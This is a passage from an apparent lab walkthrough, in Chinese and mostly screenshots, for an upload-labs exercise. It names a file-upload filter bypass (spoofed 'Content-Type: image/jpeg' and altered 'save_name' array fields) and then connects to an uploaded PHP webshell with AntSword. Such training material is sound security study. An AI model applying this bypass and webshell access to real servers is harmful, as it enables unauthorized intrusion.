![PixPin_2025-05-16_22-34-50](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-34-50.1zihh8mjzw.webp)

使用蚁剑连接 `fish1.php`

![PixPin_2025-05-16_22-35-20](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-35-20.39lenk532m.webp)

## Pass-20

代码审计

![PixPin_2025-05-16_22-47-20](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-47-20.1sf9ltgdkj.webp)

修改 `Content-Type: image/jpeg`、`save_name[0]` 和 `save_name[2]`

![PixPin_2025-05-16_22-45-28](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-45-28.2veywp9uo4.webp)

使用蚁剑连接 `fish.php`

![PixPin_2025-05-16_22-45-57](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-45-57.3rbgc5k7ps.webp)
